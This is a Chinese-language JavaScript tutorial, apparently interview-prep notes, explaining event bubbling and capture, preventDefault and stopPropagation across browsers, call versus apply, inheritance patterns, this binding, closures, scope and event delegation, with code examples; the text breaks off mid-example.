事件传递后的默认处理是指，通常浏览器在事件传递并处理完后会执行与该事件关联的默认动作（如果存在这样的动作）。例如，如果表单中input type 属性是“submit”，点击后在事件传播完浏览器就就自动提交表单。又例如，input 元素的 keydown 事件发生并处理后，浏览器默认会将用户键入的字符自动追加到 input 元素的值中。 要取消浏览器的事件传递,IE与DOM标准又有所不同。 在IE下,通过设置 event 对象的 cancelBubble 为 true 即可。 123function someHandle() &#123; window.event.cancelBubble = true; &#125; DOM标准通过调用 event对象的 stopPropagation() 方法即可。 123function someHandle(event) &#123; event.stopPropagation(); &#125; 因些，跨浏览器的停止事件传递的方法是: 123456function someHandle(event) &#123; event = event || window.event; if(event.stopPropagation) event.stopPropagation(); else event.cancelBubble = true; &#125; 取消事件传递后的默认处理，IE与DOM标准又不所不同。 在IE下,通过设置 event 对象的 returnValue 为 false 即可。 123function someHandle() &#123; window.event.returnValue = false; &#125; 因些，跨浏览器的取消事件传递后的默认处理方法是： 123function someHandle(event) &#123; event.preventDefault(); &#125; IE 和标准下有哪些兼容性的写法123var ev = ev || window.eventdocument.documentElement.clinetWidth || document.body.clientWidthvar target = ev.srcElement || ev.target call 和 apply 的区别call 和 apply 相同点：都是为了用一个本不属于一个对象的方法，让这个对象去执行 基本使用 call() 1function.call(obj[,arg1[, arg2[, [,.argN]]]]]) 调用call的对象必须是个函数function call的第一个参数将会是function改变上下文后指向的对象.如果不传，将会默认是全局对象window 第二个参数开始可以接收任意个参数，这些参数将会作为function的参数传入function 调用call的方法会立即执行 apply() 1function.apply(obj[,argArray]) 与call方法的使用基本一致，但是只接收两个参数，其中第二个参数必须是一个数组或者类数组，这也是这两个方法很重要的一个区别 数组与类数组小科普 数组我们都知道是什么，它的特征都有哪些呢？ 可以通过角标调用，如 array[0]2. 具有长度属性length3. 可以通过 for 循环和forEach方法进行遍历类数组顾名思义，具备的特征应该与数组基本相同，那么可以知道，一个形如下面这个对象的对象就是一个类数组 123456const arrayLike = &#123; 0: 'item1', 1: 'item2', 2: 'item3', length: 3&#125; 类数组arrayLike可以通过角标进行调用，具有length属性，同时也可以通过 for 循环进行遍历 我们经常使用的获取dom节点的方法返回的就是一个类数组，在一个方法中使用 arguments关键字获取到的该方法的所有参数也是一个类数组 但是类数组却不能通过forEach进行遍历，因为forEach是数组原型链上的方法，类数组毕竟不是数组，所以无法使用 不同点 call方法从第二个参数开始可以接收任意个参数，每个参数会映射到相应位置的func的参数上，可以通过参数名调用，但是如果将所有的参数作为数组传入，它们会作为一个整体映射到func对应的第一个参数上，之后参数都为空 1234567function func (a,b,c) &#123;&#125;func.call(obj, 1,2,3)// function接收到的参数实际上是 1,2,3func.call(obj, [1,2,3])// function接收到的参数实际上是 [1,2,3],undefined,undefined apply方法最多只有两个参数，第二个参数接收数组或者类数组，但是都会被转换成类数组传入func中，并且会被映射到func对应的参数上 12345678910func.apply(obj, [1,2,3])// function接收到的参数实际上是 1,2,3func.apply(obj, &#123; 0: 1, 1: 2, 2: 3, length: 3&#125;)// function接收到的参数实际上是 1,2,3 b 继承 a 的方法方法一：对象冒充 123456789101112131415161718192021function Parent(username)&#123; this.username = username; this.hello = function()&#123; console.log(this.username); &#125;&#125;function Child(username,password)&#123; this.method = Parent; // this.method 作为一个临时的属性，并且指向了 Parent所指向的对象函数 this.method(username); // 执行 this.method 方法，即执行了 Parent 所指向的对象函数 delete this.method; // 销毁 this.method 属性，即此时 Child 就已经拥有了 Parent 的所有方法和属性 this.password = password; this.world = function()&#123; console.log(this.password); &#125;&#125;const parent = new Parent('hello parent');const child = new Child('hello child','123456');console.log(child);parent.hello();child.hello();child.world(); 方法二：call() call 方法是 Function 类中的方法call 方法的第一个参数的值赋值给类（即方法）中出现的 thiscall 方法的第二个参数开始依次赋值给类（即方法）所接受的参数 123456789101112131415161718function Parent(username)&#123; this.username = username; this.hello = function()&#123; console.log(this.username); &#125;&#125;function Child(username,password)&#123; Parent.call(this,username); this.password = password; this.world = function()&#123; console.log(this.password); &#125;&#125;const parent = new Parent('hello parent');const child = new Child('hello child','123456');parent.hello();child.hello();child.world(); 方法三：apply() apply方法接受2个参数 第一个参数与call方法的第一个参数一样，即赋值给类（即方法）中出现的this 第二个参数为数组类型，这个数组中的每个元素依次赋值给类（即方法）所接受的参数 123456789101112131415161718function Parent(username)&#123; this.username = username; this.hello = function()&#123; console.log(this.username); &#125;&#125;function Child(username,password)&#123; Parent.apply(this,new Array(username)); this.password = password; this.world = function()&#123; console.log(this.password); &#125;&#125;const parent = new Parent('hello parent');const child = new Child('hello child','123456');parent.hello();child.hello();child.world(); 方法四：原型链 即子类通过 prototype 将所有在父类中通过 prototype 追加的属性和方法都追加到 Child ,从而实现继承 1234567891011121314function Parent()&#123;&#125;Parent.prototype.hello = "hello";Parent.prototype.sayHello = function()&#123; console.log(this.hello);&#125;function Child()&#123;&#125;Child.prototype = new Parent();// 将 Parent 中所有通过 prototype 追加的属性和方法都追加到 Child 从而实现了继承Child.prototype.world = "world";Child.prototype.sayWorld = function()&#123; console.log(this.world);&#125;const child = new Child();child.sayHello();child.sayWorld(); 方法五：混合方式，call（）+ 原型链 1234567891011121314151617function Parent(hello)&#123; this.hello = hello;&#125;Parent.prototype.sayHello = function()&#123; console.log(this.hello);&#125;function Child(hello,world)&#123; Parent.call(this,hello); // 将父类的属性继承过来 this.world = world;&#125;Child.prototype = new Parent(); //将父类的方法继承过来Child.prototype.sayWorld = function()&#123; // 新增方法 console.log(this.world);&#125;const child = new Child("hello","world");child.sayHello();child.sayWorld(); JavaScript this 指针、闭包、作用域js 中的this 指针 在函数执行时，this 总是指向调用该函数的对象。要判断 this 的指向，其实就是判断 this 所在的函数属于谁。 在《javaScript语言精粹》这本书中，把 this 出现的场景分为四类，简单的说就是： 1）有对象就指向调用对象 123456var myObject = &#123; value: 123 &#125;myObject.getValue = function()&#123; console.log(this.value); // 123 console.log(this); // &#123;value: 123, getValue: ƒ&#125;&#125;myObject.getValue(); 2）没调用对象就指向全局对象 123456789101112var myObject = &#123; value: 123 &#125;myObject.getValue = function()&#123; var foo = function()&#123; console.log(this.value); // undefined console.log(this); // Window &#123;postMessage: ƒ, blur: ƒ, focus: ƒ, close: ƒ, frames: Window, …&#125; // foo函数虽然定义在getValue 函数体内，但是不属于 getValue也不属于 myObject,所以调用的时候，它的 this 指针指向了全局对象 &#125; foo(); return this.value;&#125;console.log(myObject.getValue()); // 123 3) 用new构造就指向新对象 123456// js 中通过 new 关键词来调用构造函数，此时 this 会绑定杂该新对象上var someClass = function()&#123; this.value = 123;&#125;var myCreate = new someClass();console.log(myCreate.value); // 123 4）通过 apply 或 call 或 bind 来改变 this 的指向 123456789var myObject = &#123; value: 123 &#125;;var foo = function()&#123; console.log(this);&#125;foo(); // Window &#123;postMessage: ƒ, blur: ƒ, focus: ƒ, close: ƒ, frames: Window, …&#125;foo.apply(myObject); // &#123;value: 123&#125;foo.call(myObject); // &#123;value: 123&#125;var newFoo = foo.bind(myObject);newFoo(); // &#123;value: 123&#125; 闭包闭包英文是 Closure ，简而言之，闭包就是 函数的局部集合，只是这些局部变量在函数返回后会继续存在 函数的“堆栈”在函数返回后并不释放，可以理解为这些函数堆栈并不在栈上分配而是在堆上分配 当在一个函数内部定义另外一个函数就会产生闭包 作为局部变量都可以被函数内的代码访问，这个和静态语言是没有差别的，闭包的差别在于局部变量可以在函数执行结束后仍然被函数外的代码访问，这意味着函数必须返回一个指向闭包的“引用”，或将这个“引用”赋值给某个外部变量，才能保证闭包中局部变量被外部代码访问，当然包含这个引用的实体应该是一个对象。但是ES并没有提供相关的成员和方法来访问包中的局部变量，但是在ES中，函数对象中定义的内部函数是可以直接访问外部函数的局部变量，通过这种机制，可以用如下方式完成对闭包的访问。 12345678910function greeting(name)&#123; var text = "Hello " + name; // 局部变量 // 每次调用时，产生闭包，并返回内部函数对象给调用者 return function()&#123; console.log(text); &#125;&#125;var sayHello = greeting('Closure');// 通过闭包访问到了局部变量textsayHello(); // 输出Hello Closure 在 ECMAscript 的脚本函数运行时，每个函数关联都有一个执行上下文场景（Exection Context），这个执行上下文包括三个部分 文法环境（The LexicalEnvironment） 变量环境（The VariableEnvironment） this绑定 其中第三点this绑定与闭包无关，不在本文中讨论。文法环境中用于解析函数执行过程使用到的变量标识符。我们可以将文法环境想象成一个对象，该对象包含了两个重要组件，环境记录(Enviroment Recode)，和外部引用(指针)。环境记录包含包含了函数内部声明的局部变量和参数变量，外部引用指向了外部函数对象的上下文执行场景。全局的上下文场景中此引用值为NULL。这样的数据结构就构成了一个单向的链表，每个引用都指向外层的上下文场景。 例如上面我们例子的闭包模型应该是这样，sayHello函数在最下层，上层是函数greeting，最外层是全局场景。如下图： 因此当sayHello被调用的时候，sayHello会通过上下文场景找到局部变量text的值，因此在屏幕的对话框中显示出”Hello Closure” 针对一些例子来帮助大家更加深入的理解闭包,下面共有5个样例，例子来自于JavaScript Closures For Dummies(镜像)。 例子1:闭包中局部变量是引用而非拷贝 12345678910function say667()&#123; var num = 666; var sayConsole = function()&#123; console.log(num); &#125; num++; return sayConsole;&#125;var sayConsole = say667();sayConsole(); // 667 例子2：多个函数绑定同一个闭包，因为他们定义在同一个函数内。 123456789101112function setupSomeGlobals()&#123; var num = 666; gConsoleNumber = function() &#123; console.log(num); &#125; gIncreaseNumber = function() &#123; num++; &#125; gSetNumber = function(x) &#123; num = x; &#125;&#125;setupSomeGlobals();gConsoleNumber(); // 666gIncreaseNumber();gConsoleNumber(); // 667gSetNumber(12);gConsoleNumber(); // 12 例子3：当在一个循环中赋值函数时，这些函数将绑定同样的闭包 1234567891011121314151617function buildList(list)&#123; var result = []; for(var i = 0; i &lt; list.length; i++)&#123; var item = 'item' + list[i]; result.push(function()&#123; console.log(item+' '+list[i]); &#125;) &#125; return result;&#125;function testList()&#123; var fnList = buildList([1,2,3]); for(var j = 0; j &lt; fnList.length; j++)&#123; fnListj; &#125;&#125;testList(); // 输出3次 item3 undefined testList的执行结果是弹出item3 undefined窗口三次，因为这三个函数绑定了同一个闭包，而且item的值为最后计算的结果，但是当i跳出循环时i值为4，所以list[4]的结果为undefined. 例子4：外部函数所有局部变量都在闭包内，即使这个变量声明在内部函数定义之后。 123456789function sayAlice()&#123; var sayConsole = function()&#123; console.log(alice); &#125; var alice = "Hello Alice"; return sayConsole;&#125;var helloAlice=sayAlice();helloAlice(); 执行结果输出”Hello Alice”的窗口。即使局部变量声明在函数sayAlert之后，局部变量仍然可以被访问到。 例子5：每次函数调用的时候创建一个新的闭包 12345678910111213141516function newClosure(someNum,someRef)&#123; var num = someNum; var anArray = [1,2,3]; var ref = someRef; return function(x)&#123; num += x; anArray.push(num); console.log('num: ' + num +'\nanArray ' + anArray.toString() +'\nref.someVar ' + ref.someVar); &#125;&#125;closure1=newClosure(40,&#123;someVar:'closure 1'&#125;);closure2=newClosure(1000,&#123;someVar:'closure 2'&#125;);closure1(5); // num: 45 anArray 1,2,3,45 ref.someVar closure 1closure2(-10); // num: 990 anArray 1,2,3,990 ref.someVar closure 2 闭包的缺点：（1）由于闭包会使得函数中的变量都被保存在内存中，内存消耗很大，所以不能滥用闭包，否则会造成网页的性能问题，在IE中可能导致内存泄露。解决方法是，在退出函数之前，将不使用的局部变量全部删除。 （2）闭包会在父函数外部，改变父函数内部变量的值。所以，如果你把父函数当作对象（object）使用，把闭包当作它的公用方法（Public Method），把内部变量当作它的私有属性（private value），这时一定要小心，不要随便改变父函数内部变量的值。 例子： 12345678910111213function Cars()&#123; this.name = "Benz"; this.color = ["white","black"];&#125;Cars.prototype.sayColor = function()&#123; var outer = this; return function()&#123; return outer.color &#125;;&#125;; var instance = new Cars();console.log(instance.sayColor()()) 改造： 1234567891011121314function Cars()&#123; this.name = "Benz"; this.color = ["white","black"];&#125;Cars.prototype.sayColor = function()&#123; var outerColor = this.color; //保存一个副本到变量中 return function()&#123; return outerColor; //应用这个副本 &#125;; outColor = null; //释放内存&#125;; var instance = new Cars();console.log(instance.sayColor()()) 作用域在JS当中一个变量的作用域（scope）是程序中定义这个变量的区域。变量分为两类：全局（global）的和局部的。其中全局变量的作用域是全局性的，即在JavaScript代码中，它处处都有定义。而在函数之内声明的变量，就只在函数体内部有定义。它们是局部变量，作用域是局部性的。函数的参数也是局部变量，它们只在函数体内部有定义。 我们可以借助JavaScript的作用域链（scope chain）更好地了解变量的作用域。每个JavaScript执行环境都有一个和它关联在一起的作用域链。这个作用域链是一个对象列表或对象链。当JavaScript代码需要查询变量x的值时（这个过程叫做变量解析（variable name resolution）），它就开始查看该链的第一个对象。如果那个对象有一个名为x的属性，那么就采用那个属性的值。如果第一个对象没有名为x的属性，JavaScript就会继续查询链中的第二个对象。如果第二个对象仍然没有名为x的属性，那么就继续查询下一个对象，以此类推。如果查询到最后（指顶层代码中）不存在这个属性，那么这个变量的值就是未定义的。 12345678910var a,b;(function()&#123; alert(a); // undefined alert(b); // undefined var a = b = 3; alert(a); // 3 alert(b); // 3&#125;)(); alert(a); // undefined alert(b); // 3 以上代码相当于 12345678910var a,b;(function()&#123; alert(a); alert(b); var a = 3; b = 3; alert(a); alert(b);&#125;)(); alert(a); 事件委托是什么？概述 什么叫做事件委托，别名叫事件代理，JavaScript 高级程序设计上讲。事件委托就是利用事件冒泡，只指定一个事件处理程序，就可以管理某一类型的所有事件。 实际例子： 有三个同事预计会在周一收到快递，为签收快递，有两种方法：一是三个人在公司门口等快递，二是委托给前台的小姐代为签收。现实生活中，我们大多采用委托的方案（公司也不会容忍那么多人站在门口）。前台小姐收到快递后，会判断收件人是谁，按照收件人的要求签收，甚至是代付。这种方案还有一个好处就是，即使公司来了很多新员工（不管多少），前台小姐也会在收到寄给新员工们的快递后核实代为签收。 这里有2层意思：第一、现在委托前台的小姐是可以代为签收的，即程序中的现有的 DOM 节点是有事件的。 第二、新员工也可以被前台小姐代为签收，即程序中新添加的 DOM 节点也是有事件的。 为什么要使用事件委托 一般来说，DOM 需要有事件处理程序，就会直接给它设处理程序，但是如果是很多 DOM 需要添加处理事件呢？例如我们有100个 li，每个 li 都有相同的 click 点击事件，可能我们会用到 for 循环，来遍历所有 li ,然后给它们添加事件，那么会存在什么样的问题？ 在 JavsScript 中，添加到页面上的事件处理程序数量将直接影响到整体运行性能，因为需要不断地与 DOM 进行交互，访问 DOM 的次数越多，引起浏览器重绘与重排的次数也就越多，就会延长整个页面的交互就绪时间，这就是为什么性能优化的主要思想之一就是减少 DOM 操作的原因、如果要用到事件委托，就会将所有的操作都放在 js 程序里面，与 DOM 的操作就只需要交互一次，这样就可以大大减少与 DOM 的交互次数，提高性能。 每个函数都是一个对象，是对象就会占用内存，对象越多，内存占用率就越大，自然性能就越差了（内存不够用，是硬伤，哈哈），比如上面的100个li，就要占用100个内存空间，如果是1000个，10000个呢，那只能说呵呵了，如果用事件委托，那么我们就可以只对它的父级（如果只有一个父级）这一个对象进行操作，这样我们就需要一个内存空间就够了，是不是省了很多，自然性能就会更好。 事件委托的原理 事件委托是利用事件的冒泡原理来实现的，何为事件冒泡？就是事件从最深的节点开始执行，然后逐步向上传播事件，例子： 页面上有一个节点树，div&gt;ul&gt;li&gt;a，比如给最里面的 a 加一个 click 点击事件，那么这个事件就会一层一层的往外执行，执行顺序 a&gt;li&gt;ul&gt;div，有这么一个机制，那么我们给最外面的 div 加点击事件，那么里面的 ul,li,a 做点击事件的时候，都会冒泡到最外层的 div 上面，都会触发，这就是事件委托，委托他们父级代为执行事件。 事件委托怎么实现 123456&lt;ul id="ul"&gt; &lt;li&gt;111&lt;/li&gt; &lt;li&gt;222&lt;/li&gt; &lt;li&gt;333&lt;/li&gt; &lt;li&gt;444&lt;/li&gt;&lt;/ul&gt; 实现功能是点击li，弹出123： 123456789window.onload = function()&#123; var oUl = document.getElementById('ul'); var aLi = oUl.getElementsByTagName('li'); for(var i = 0; i &lt; aLi.length; i++)&#123; aLi[i].onclick = function()&#123; alert(123); &#125; &#125;&#125; 上面的代码的意思很简单，相信很多人都是这么实现的，我们看看有多少次的dom操作，首先要找到ul，然后遍历li，然后点击li的时候，又要找一次目标的li的位置，才能执行最后的操作，每次点击都要找一次li； 那么我们用事件委托的方式做又会怎么样呢？ 123456window.onload = function()&#123; var oUl = document.getElementById('ul'); oUl.onclick = function()&#123; alert(123); &#125;&#125; 这里用父级ul做事件处理，当li被点击时，由于冒泡原理，事件就会冒泡到ul上，因为ul上有点击事件，所以事件就会触发，当然，这里当点击ul的时候，也是会触发的，那么问题就来了，如果我想让事件代理的效果跟直接给节点的事件效果一样怎么办，比如说只有点击li才会触发，不怕，我们有绝招： Event对象提供了一个属性叫target，可以返回事件的目标节点，我们成为事件源，也就是说，target就可以表示为当前的事件操作的dom，但是不是真正操作dom，当然，这个是有兼容性的，标准浏览器用ev.target，IE浏览器用event.srcElement，此时只是获取了当前节点的位置，并不知道是什么节点名称，这里我们用nodeName来获取具体是什么标签名，这个返回的是一个大写的，我们需要转成小写再做比较（习惯问题）： 12345678910window.onload = function()&#123; var oUl = document.getElementById("ul"); oUl.onclick = function(ev)&#123; var ev = ev || window.event; var target = ev.target || ev.srcElement; if(target.nodeName.toLowerCase() == "li")&#123; alert(target.innerHTML); &#125; &#125;&#125; 这样改下就只有点击li会触发事件了，且每次只执行一次dom操作，如果li数量很多的话，将大大减少dom的操作，优化的性能可想而知！ 上面的例子是说li操作的是同样的效果，要是每个li被点击的效果都不一样，那么用事件委托还有用吗？ 12345678910111213141516var Add = document.getElementById("add");var Remove = document.getElementById("remove");var Move = document.getElementById("move");var Select = document.getElementById("select");Add.onclick = function()&#123; alert('添加');&#125;;Remove.onclick = function()&#123; alert('删除');&#125;;Move.onclick = function()&#123; alert('移动');&#125;;Select.onclick = function()&#123; alert('选择');&#125; 上面实现的效果我就不多说了，很简单，4个按钮，点击每一个做不同的操作，那么至少需要4次dom操作，如果用事件委托，能进行优化吗？ 123456789101112131415161718192021222324var oBox = document.getElementById("box");oBox.onclick = function(ev)&#123; var ev = ev || window.event; var target = ev.target || ev.srcElement; if(target.nodeName.toLowerCase() == 'input')&#123; switch(target.id) &#123; case 'add': alert('添加'); break; case 'remove': alert('删除'); break; case 'move': alert('移动'); break; case 'select': alert('选择'); break; default : alert('业务错误'); break; &#125; &#125;&#125; 用事件委托就可以只用一次dom操作就能完成所有的效果，比上面的性能肯定是要好一些的 现在讲的都是document加载完成的现有dom节点下的操作，那么如果是新增的节点，新增的节点会有事件吗？也就是说，一个新员工来了，他能收到快递吗？ 1234567&lt;input type="button" name="" id="btn" value="添加" /&gt;&lt;ul id="ul1"&gt; &lt;li&gt;111&lt;/li&gt; &lt;li&gt;222&lt;/li&gt; &lt;li&gt;333&lt;/li&gt; &lt;li&gt;444&lt;/li&gt;&lt;/ul&gt; 现在是移入li，li变红，移出li，li变白，这么一个效果，然后点击按钮，可以向ul中添加一个li子节点 123456789101112131415161718192021222324window.onload = function()&#123; var oBtn = document.getElementById("btn"); var oUl = document.getElementById("ul"); var aLi = oUl.getElementsByTagName("li"); var num = 4; // 鼠标移入变红，移出变白 for(var i = 0; i &lt; aLi.length; i++)&#123; aLi[i].onmouseover = function()&#123; this.style.background = 'red'; &#125; aLi[i].onmouseout = function()&#123; this.style.background = '#fff'; &#125; &#125; // 新增节点 oBtn.onclick = function()&#123; num++; var oLi = document.createElement('li'); oLi.innerHTML = 111 * num; oUl.appendChild(oLi); &#125;&#125; 这是一般的做法，但是你会发现，新增的li是没有事件的，说明添加子节点的时候，事件没有一起添加进去，这不是我们想要的结果，那怎么做呢？一般的解决方案会是这样，将for循环用一个函数包起来，命名为mHover，如下： 1234567891011121314151617181920212223242526272829// 将鼠标移出移入包装为一个函数window.onload = function()&#123; var oBtn = document.getElementById("btn"); var oUl = document.getElementById("ul"); var aLi = oUl.getElementsByTagName("li"); var num = 4; // 鼠标移入变红，移出变白 function mHover()&#123; for(var i = 0; i &lt; aLi.length; i++)&#123; aLi[i].onmouseover = function()&#123; this.style.background = 'red'; &#125; aLi[i].onmouseout = function()&#123; this.style.background = '#fff'; &#125; &#125; &#125; mHover(); // 新增节点 oBtn.onclick = function()&#123; num++; var oLi = document.createElement('li'); oLi.innerHTML = 111 * num; oUl.appendChild(oLi); mHover(); &#125;&#125; 虽然功能实现了，看着还挺好，但实际上无疑是又增加了一个dom操作，在优化性能方面是不可取的，那么有事件委托的方式，能做到优化吗？ 12345678910111213141516171819202122232425262728293031window.onload = function()&#123; var oBtn = document.getElementById("btn"); var oUl = document.getElementById("ul"); var aLi = oUl.getElementsByTagName("li"); var num = 4; // 事件委托 鼠标移入变红，移出变白 // 添加的子元素也有事件 oUl.onmouseover = function()&#123; var ev = ev || window.event; var target = ev.target || ev.srcElement; if(target.nodeName.toLowerCase() == 'li')&#123; target.style.background = 'red'; &#125; &#125; oUl.onmouseout = function()&#123; var ev = ev || window.event; var target = ev.target || ev.srcElement; if(target.nodeName.toLowerCase() == 'li')&#123; target.style.background = '#fff'; &#125; &#125; // 新增节点 oBtn.onclick = function()&#123; num++; var oLi = document.createElement('li'); oLi.innerHTML = 111 * num; oUl.appendChild(oLi); &#125;&#125; 另外一个思考的问题 现在给一个场景 ul &gt; li &gt; div &gt;p，div占满li，p占满div，还是给ul绑定时间，需要判断点击的是不是li（假设li里面的结构是不固定的），那么e.target就可能是p，也有可能是div，这种情况你会怎么处理呢？ 1234567891011121314 &lt;ul id="test"&gt; &lt;li&gt; &lt;p&gt;11111111111&lt;/p&gt; &lt;/li&gt; &lt;li&gt; &lt;div&gt; 22222222 &lt;/div&gt; &lt;/li&gt; &lt;li&gt; &lt;span&gt;3333333333&lt;/span&gt; &lt;/li&gt; &lt;li&gt;4444444&lt;/li&gt;&lt;/ul&gt; 如上列表，有4个li，里面的内容各不相同，点击li，event对象肯定是当前点击的对象，怎么指定到li上，下面我直接给解决方案： 1234567891011var oUl = document.getElementById('test');oUl.addEventListener('click',function(ev)&#123; var target = ev.target; while (target !== oUl) &#123; if(target.tagName.toLowerCase() == 'li')&#123; alert(target.innerHTML); break; &#125; target = target.parentNode; &#125;&#125;); 如何阻止事件冒泡和默认事件在解答这个问题之前，先来看看事件的执行顺序 12345&lt;div&gt; &lt;ul&gt; &lt;li&gt;冒泡/捕获&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; 实例： 12345678910111213141516171819202122232425262728293031var html = document.documentElement;var body = document.body;var div = body.querySelector('div');var ul = body.querySelector('ul');var li = body.querySelector('li');// 捕获ul.addEventListener('click',captureCallback,true);li.addEventListener('click',captureCallback,true);div.addEventListener('click',captureCallback,true);body.addEventListener('click',captureCallback,true);html.addEventListener('click',captureCallback,true); // 冒泡ul.addEventListener('click',bubblingCallback,false);li.addEventListener('click',bubblingCallback,false);div.addEventListener('click',bubblingCallback,false);body.addEventListener('click',bubblingCallback,false);html.addEventListener('click',bubblingCallback,false);function captureCallback(e)&#123; // e.stopPropagation(); var target = e.currentTarget; console.log(target.tagName);&#125; function bubblingCallback(e)&#123; // e.stopPropagation(); var target = e.currentTarget; console.log(target.tagName);&#125; 点击 html 中的冒泡/捕获，可以得到下面的结果 12345678910capturing&amp;bubbling phase.html:36 HTMLcapturing&amp;bubbling phase.html:36 BODYcapturing&amp;bubbling phase.html:36 DIVcapturing&amp;bubbling phase.html:36 ULcapturing&amp;bubbling phase.html:36 LIcapturing&amp;bubbling phase.html:40 LIcapturing&amp;bubbling phase.html:40 ULcapturing&amp;bubbling phase.html:40 DIVcapturing&amp;bubbling phase.html:40 BODYcapturing&amp;bubbling phase.html:40 HTML 总结就是先捕获，后冒泡，捕获是从上到下，冒泡是从下到上。（形象说法：捕获像石头沉入海底，冒泡像气球冒出水面） 去掉 函数 bubblingCallback 中的 e.stopPropagation()的注释，则只会进行捕获，输出 123456capturing&amp;bubbling phase.html:40 HTMLcapturing&amp;bubbling phase.html:40 BODYcapturing&amp;bubbling phase.html:40 DIVcapturing&amp;bubbling phase.html:40 ULcapturing&amp;bubbling phase.html:40 LIcapturing&amp;bubbling phase.html:45 LI 而取消 函数 captureCallback中的 e.stopPropagation() 注释，则只捕获到 最上面的标签 1capturing&amp;bubbling phase.html:40 HTML 通过上面，我们可以得知， event.stopPropagation()，可以阻止 捕获和冒泡阶段当前事件的进一步传播。 规则： 在冒泡事件和捕获事件同时存在的情况下，捕获事件优先级高一点 在同一个元素的绑定事件中，冒泡和捕获没有次序之分，遵循Javascript的执行顺序。 在元素上同时绑定捕获事件和冒泡事件，如果通过此元素的子级元素触发，则优先触发捕获事件，若不通过此元素的子级元素触发，则按照Javascript执行顺序触发。 事件不同浏览器处理函数 element.addEventListener(type, listener[, useCapture]); // IE6~8不支持（捕获和冒泡通过useCapture,默认false） element.attachEvent(’on’ + type, listener); // IE6~10，IE11不支持(只执行冒泡事件) element[’on’ + type] = function(){} // 所有浏览器（默认执行冒泡事件） -事件不同浏览器处理函数.png) W3C 中定义了 3个事件阶段，依次是捕获阶段、目标阶段、冒泡阶段。事件对象按照上图的传播路径依次完成这些阶段。如果某个阶段不支持或事件对象的传播被终止，那么该阶段就会被跳过。举个例子，如果Event.bubbles属性被设置为false，那么冒泡阶段就会被跳过。如果Event.stopPropagation()在事件派发前被调用，那么所有的阶段都会被跳过。 捕获 阶段：在事件对象到达事件目标之前，事件对象必须从 window 经过目标的祖先节点传播到事件目标。这个阶段被我们称为捕获阶段，在这个阶段注册的事件监听器在事件到达其目标前必须先处理事件。 目标 阶段：事件对象到达其事件目标，这个阶段被我们称之为目标阶段。一旦事件对象达到事件目标，该阶段的事件监听器就要对它进行处理。如果一个事件对象类型被标志为不能冒泡。那么对应的事件对象在到此阶段时就会终止传播。 冒泡 阶段：事件对象以一个与捕获阶段相反的方向从事件目标传播经过其祖先节点传播到 window，这个阶段被称之为冒泡阶段，在此阶段注册的事件监听器会对应的冒泡事件进行处理 在一个事件完成了所有阶段的传播路径后，它的Event.currentTarget会被设置为null并且Event.eventPhase会被设为0。Event的所有其他属性都不会改变（包括指向事件目标的Event.target属性） 跨浏览器的事件处理函数 123456789101112131415161718192021var EventUtil = &#123; addHandler: function(element, type, handler) &#123; if (element.addEventListener) &#123; // DOM2 element.addEventListener(type, handler, false); &#125; else if (element.attachEvent) &#123; // IE element.attachEvent('on' + type, handler); &#125; else &#123; // DOM0 element['on' + type] = handler; &#125; &#125;, removeHandler: function(element, type, handler) &#123; if (element.removeEventListener) &#123; element.removeEventListener(type, handler, false); &#125; else if (element.detachEvent) &#123; element.detachEvent('on' + type, handler); &#125; else &#123; element['on' + type] = null; &#125; &#125;&#125;; 跨浏览器的事件对象： 12345678910111213141516171819202122232425var EventUtil = &#123; getEvent: function(e) &#123; return e ? e : window.e; &#125;, getTarget: function(e) &#123; return e.target || e.srcElement; &#125;, preventDefault: function(e) &#123; if (e.preventDefault) &#123; e.preventDefault(); &#125; else &#123; e.returnValue = false; &#125; &#125;, stopPropagation: function(e) &#123; if (e.stopPropagation) &#123; e.stopPropagation() &#125; else &#123; e.cancelBubble = true; &#125; &#125;&#125; js冒泡和捕获是事件的两种行为，使用event.stopPropagation()起到阻止捕获和冒泡阶段中当前事件的进一步传播。使用event.preventDefault()可以取消默认事件。 防止冒泡和捕获 w3c的方法是e.stopPropagation()，IE则是使用e.cancelBubble = true topPropagation也是事件对象(Event)的一个方法，作用是阻止目标元素的冒泡事件，但是会不阻止默认行为。什么是冒泡事件？如在一个按钮是绑定一个”click”事件，那么”click”事件会依次在它的父级元素中被触发。stopPropagation就是阻止目标元素的事件冒泡到父级元素。如： 123456&lt;div id='div' onclick='alert("div");'&gt; &lt;ul onclick='alert("ul");'&gt; &lt;li onclick='alert("li");'&gt;test&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; 单击时，会依次触发alert(“li”),alert(“ul”),alert(“div”)，这就是事件冒泡。 阻止冒泡 1window.event? window.event.cancelBubble = true : e.stopPropagation(); 取消默认事件 w3c的方法是e.preventDefault()，IE则是使用e.returnValue = false preventDefault它是事件对象(Event)的一个方法，作用是取消一个目标元素的默认行为。既然是说默认行为，当然是元素必须有默认行为才能被取消，如果元素本身就没有默认行为，调用当然就无效了。什么元素有默认行为呢？如链接&amp;lt;a&amp;gt;，提交按钮 &amp;lt;input type=&amp;quot;submit&amp;quot;&amp;gt; 等。当Event 对象的cancelable为false时，表示没有默认行为，这时即使有默认行为，调用preventDefault也是不会起作用的。 我们都知道，链接 &amp;lt;a&amp;gt; 的默认动作就是跳转到指定页面，下面就以它为例，阻止它的跳转： 123456789//假定有链接&lt;a href="http://laibh.top/" id="testA" &gt;laibh.top&lt;/a&gt;var a = document.getElementById("test");a.onclick =function(e)&#123;if(e.preventDefault)&#123; e.preventDefault(); &#125;else&#123; window.event.returnValue == false; &#125;&#125; return false javascript的return false只会阻止默认行为，而是用jQuery的话则既阻止默认行为又防止对象冒泡 下面这个使用原生js，只会阻止默认行为，不会停止冒泡 1234567891011&lt;div id='div' onclick='alert("div");'&gt;&lt;ul onclick='alert("ul");'&gt; &lt;li id='ul-a' onclick='alert("li");'&gt;&lt;a href="http://caibaojian.com/"id="testB"&gt;caibaojian.com&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;script&gt; var a = document.getElementById("testB"); a.onclick = function()&#123; return false; &#125;;&lt;/script&gt; 总结使用方法 当需要停止冒泡行为时，可以使用 123456789function stopBubble(e) &#123; //如果提供了事件对象，则这是一个非IE浏览器 if ( e &amp;&amp; e.stopPropagation ) //因此它支持W3C的stopPropagation()方法 e.stopPropagation(); else //否则，我们需要使用IE的方式来取消事件冒泡 window.event.cancelBubble = true; &#125; 当需要阻止默认行为时，可以使用 12345678910//阻止浏览器的默认行为 function stopDefault( e ) &#123; //阻止默认浏览器动作(W3C) if ( e &amp;&amp; 